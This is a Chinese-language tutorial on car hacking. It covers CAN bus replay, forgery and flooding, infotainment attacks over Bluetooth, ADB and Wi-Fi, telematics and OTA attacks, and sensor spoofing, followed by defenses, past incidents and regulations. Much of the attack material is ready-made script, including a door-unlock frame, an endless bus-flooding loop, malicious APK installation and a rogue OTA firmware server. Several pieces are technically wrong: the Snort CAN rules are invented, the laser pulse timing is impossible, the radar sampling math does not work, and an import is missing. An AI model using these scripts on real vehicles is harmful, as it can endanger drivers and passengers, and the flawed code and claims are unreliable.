# 车辆黑客攻击技术

## 车辆黑客攻击概述

现代汽车包含数十个 ECU (电子控制单元)，通过 CAN 总线通信。

### 攻击面

| 攻击面 | 示例 | 风险 |
|------|------|------|
| OBD-II 端口 | 物理访问 | 控制 ECU |
| 蓝牙/USB | 信息娱乐系统 | 远程代码执行 |
| 远程信息处理 | 蜂窝网络 | 远程控制车辆 |
| 传感器欺骗 | 激光雷达/雷达 | 误导自动驾驶 |
| 固件更新 | OTA 更新 | 安装恶意固件 |

---

## CAN 总线攻击

### CAN 协议基础

- **速度：** 500 kbps (高速 CAN)
- **仲裁：** 基于 ID 的优先级
- **无认证：** 任何 ECU 可以发送任意帧

### 攻击1：重放攻击

**原理：** 捕获合法 CAN 帧并重放

```python
# 使用 python-can 重放 CAN 帧
import can

bus = can.interface.Bus(channel='can0', bustype='socketcand')

# 捕获帧
frames = []
for msg in bus:
    frames.append(msg)
    if len(frames) >= 100:
        break

# 重放帧
for msg in frames:
    bus.send(msg)
```

### 攻击2：伪造帧

**原理：** 发送恶意 CAN 帧控制车辆功能

```python
# 伪造解锁车门帧
import can

bus = can.interface.Bus(channel='can0', bustype='socketcand')

# 伪造帧 (示例 ID 和载荷)
msg = can.Message(
    arbitration_id=0x123,  # 车门解锁命令 ID
    data=[0x01, 0x00, 0x00, 0x00],  # 解锁命令
    is_extended_id=False
)

bus.send(msg)
print('Sent malicious frame')
```

### 攻击3：拒绝服务 (DoS)

**原理：** 发送高优先级帧占用总线

```python
# DoS 攻击 (发送最高优先级帧)
import can
import time

bus = can.interface.Bus(channel='can0', bustype='socketcand')

# ID 0x000 是最高优先级
msg = can.Message(
    arbitration_id=0x000,
    data=[0x00] * 8,
    is_extended_id=False
)

while True:
    bus.send(msg)
    time.sleep(0.001)  # 每 1ms 发送一次
```

### 防御措施

1. **CAN 总线加密** (CAN-FD 支持)
2. **入侵检测系统 (IDS)** - 检测异常 CAN 流量
3. **认证** - 使用 HMAC 认证 CAN 帧
4. **VLAN 隔离** - 隔离关键 ECU

---

## 信息娱乐系统攻击

### 攻击面

| 接口 | 协议 | 攻击方式 |
|------|------|------------|
| 蓝牙 | Bluetooth | 配对绕过、RCE |
| USB | MTP/ADB | 恶意文件注入 |
| Wi-Fi | WPA2 | 中间人攻击 |
| 蜂窝网络 | 4G/5G | 远程利用 |

### 攻击1：蓝牙攻击

**工具：** Bluez, Ubertooth

```bash
# 扫描蓝牙设备
bluetoothctl scan on

# 配对攻击 (强制配对)
btmgmt pair -t 0 -c 0x0000 $BDADDR

# 使用 Bluez 利用漏洞
sdptool browse $BDADDR
```

### 攻击2：USB 攻击

**攻击向量：**
- 恶意 MP3 文件 (信息娱乐系统解析漏洞)
- Android Auto/Apple CarPlay 漏洞利用
- USB 调试 (ADB) 启用

```bash
# 启用 ADB (如果启用)
adb connect 192.168.1.100:5555

# 安装恶意应用
adb install malicious.apk

# 获取 shell
adb shell
```

### 攻击3：Wi-Fi 攻击

**攻击向量：**
- Evil Twin 攻击 (伪造车载 Wi-Fi 热点)
- Karmac 攻击 (响应所有 Probe Request)
- WPA2 握手破解

```bash
# 创建 Evil Twin AP
airbase-ng -a $BSSID -e "MyCar_WiFi" wlan0mon

# 使用 hostapd 创建恶意 AP
cat > hostapd.conf << EOF
interface=wlan0mon
ssid=MyCar_WiFi
channel=6
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
EOF

hostapd hostapd.conf
```

### 防御措施

1. **禁用不需要的接口** (蓝牙/USB/Wi-Fi)
2. **固件更新** - 定期更新信息娱乐系统固件
3. **网络隔离** - 隔离信息娱乐系统与其他 ECU
4. **入侵检测** - 监控异常流量

---

## 远程信息处理 (Telematics) 攻击

### 架构

```
+----------+     +----------+     +----------+
| 车辆      | --> | 远程信息处理| --> | 云端     |
| (ECU)    |     | 单元 (T-Box)|   | (服务器) |
+----------+     +----------+     +----------+
```

### 攻击1：SIM 卡克隆

**原理：** 克隆 T-Box 的 SIM 卡，接入车辆网络

**工具：** USRP B210, Gqrx

```bash
# 嗅探蜂窝流量
gnuradio-companion
# 使用 GSM 接收器解码 GSM 流量
```

### 攻击2：远程代码执行 (RCE)

**案例：** Jeep Cherokee 黑客攻击 (Charlie Miller & Chris Valasek)

**漏洞：** 信息娱乐系统 (Uconnect) 可通过蜂窝网络连接

**攻击流程：**
1. 扫描互联网暴露的 T-Box
2. 连接到信息娱乐系统
3. 利用 V850 ECU 固件漏洞
4. 控制车辆 (转向、刹车、加速)

**防御：**
- 隔离信息娱乐系统与关键 ECU
- 实施远程信息处理认证
- 禁用不需要的远程服务

### 攻击3：OTA 更新攻击

**原理：** 中间人攻击 OTA 更新过程

```python
# 伪造 OTA 更新服务器
from flask import Flask, request

app = Flask(__name__)

@app.route('/ota/update', methods=['POST'])
def ota_update():
    # 发送恶意固件
    return send_file('malicious_firmware.bin', as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')
```

**防御：**
- 固件签名验证
- 安全 Boot (Secure Boot)
- 加密 OTA 通信 (TLS)

---

## 传感器欺骗攻击

### 攻击1：激光雷达 (LiDAR) 欺骗

**原理：** 发送伪造激光脉冲误导 LiDAR

**工具：** 激光发生器

```python
# 生成伪造激光脉冲
import RPi.GPIO as GPIO
import time

LASER_PIN = 18

GPIO.setmode(GPIO.BCM)
GPIO.setup(LASER_PIN, GPIO.OUT)

# 发送伪造脉冲
while True:
    GPIO.output(LASER_PIN, GPIO.HIGH)
    time.sleep(1e-9)  # 1ns 脉冲
    GPIO.output(LASER_PIN, GPIO.LOW)
    time.sleep(1e-6)  # 1μs 间隔
```

### 攻击2：雷达欺骗

**原理：** 重放或伪造雷达信号

**工具：** 软件定义无线电 (SDR)

```matlab
% MATLAB 生成伪造雷达信号
fs = 2e6;  % 采样率
fc = 77e9;  % 77 GHz (汽车雷达频段)

% 生成线性调频信号 (Chirp)
t = 0:1/fs:50e-6;
chirp = cos(2*pi*(fc*t + (100e6/50e-6)*t.^2));

% 发送信号
sdruTransmitter('Radio', 'USRP B210', 'CenterFrequency', fc);
step(sdruTransmitter, chirp);
```

### 攻击3：摄像头欺骗

**原理：** 使用激光束欺骗摄像头

**攻击场景：**
- 使用激光束使摄像头过曝 (拒绝服务)
- 使用投影仪投射虚假交通标志

**防御：**
- 多传感器融合 (摄像头 + 激光雷达 + 雷达)
- 异常检测 (检测传感器数据异常)

---

## 防御措施

### 1. 网络隔离

```
+----------+     +----------+     +----------+
| 信息娱乐 |     | 网关      |     | 动力总成 |
| 系统     | --> | (Gateway)| --> | ECU      |
+----------+     +----------+     +----------+
                      |
                      v
                 [防火墙策略]
                 [深度包检测]
```

### 2. 入侵检测系统 (IDS)

**工具：** Snort, Suricata

```rules
# /etc/snort/rules/automotive.rules

# 检测异常 CAN ID
alert can any any -> any any (msg:"Abnormal CAN ID"; sid:1000001; rev:1;)

# 检测重放攻击
alert can any any -> any any (msg:"Replay Attack Detected"; same_id_threshold:10; time_window:1; sid:1000002; rev:1;)
```

### 3. 固件安全

- **安全 Boot** - 验证固件签名
- **固件加密** - 加密存储固件
- **调试接口禁用** - 禁用 JTAG/SWD

### 4. 渗透测试

**工具链：**
- **CANalyze** - CAN 总线分析
- **ICSim** - 车载信息系统模拟器
- **CaringCaribou** - 汽车渗透测试框架

```bash
# 使用 CaringCaribou 测试 UDS (Unified Diagnostic Services)
python3 caringcaribou.py -i can0 -s 0x7E0 -d 0x7E8 -p UDS
```

---

## 真实案例

### 案例1：Jeep Cherokee 黑客攻击

- **年份：** 2015
- **研究者：** Charlie Miller & Chris Valasek
- **攻击方式：** 通过蜂窝网络远程入侵信息娱乐系统
- **影响：** 控制车辆转向、刹车、加速
- **后果：** FCA 召回 140 万辆汽车

### 案例2：Tesla Model S 黑客攻击

- **年份：** 2016
- **研究者：** Tencent Keen Security Lab
- **攻击方式：** 通过 Wi-Fi 入侵信息娱乐系统
- **影响：** 控制车辆刹车、大灯、天窗
- **后果：** Tesla 发布 OTA 更新修复

### 案例3：BMW ConnectedDrive 黑客攻击

- **年份：** 2015
- **研究者：** ADAC
- **攻击方式：** 伪造 BMW 服务器，发送虚假解锁命令
- **影响：** 远程解锁车辆
- **后果：** BMW 修复漏洞

---

## 法规与标准

### 1. UN R155 (网络安全管理系统)

- **要求：** 汽车制造商必须实施网络安全管理系统 (CSMS)
- **范围：** 乘用车、轻型卡车
- **生效：** 2021 年 1 月

### 2. UN R156 (软件更新管理系统)

- **要求：** 汽车制造商必须实施软件更新管理系统 (SUMS)
- **范围：** OTA 更新
- **生效：** 2021 年 1 月

### 3. ISO/SAE 21434 (道路车辆网络安全工程)

- **要求：** 定义汽车网络安全工程流程
- **范围：** 整个车辆生命周期
- **发布：** 2021 年 8 月

---

## 延伸阅读

- [Car Hacking Village](https://www.carhackingvillage.com/) - 汽车黑客大会
- [ICSim (Instrument Cluster Simulator)](https://github.com/zombieCraig/ICSim) - 车载信息系统模拟器
- [CaringCaribou](https://github.com/CaringCaribou/caringcaribou) - 汽车渗透测试框架

---

**下一步：** 学习 [合规与审计](#合规与审计)，掌握汽车网络安全合规要求。
